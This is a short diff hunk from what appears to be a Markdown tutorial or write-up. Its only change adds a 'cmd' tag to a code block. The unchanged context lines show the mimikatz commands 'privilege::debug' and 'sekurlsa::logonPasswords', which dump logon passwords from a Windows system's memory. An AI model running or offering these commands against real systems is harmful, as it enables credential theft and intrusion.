@@ -12,7 +12,7 @@ So first things first, we have to ensure mimikatz is on his system and then we u
 
 Once we run it, we run this command:
 
-```
+```cmd
 privilege::debug
 sekurlsa::logonPasswords
 ```
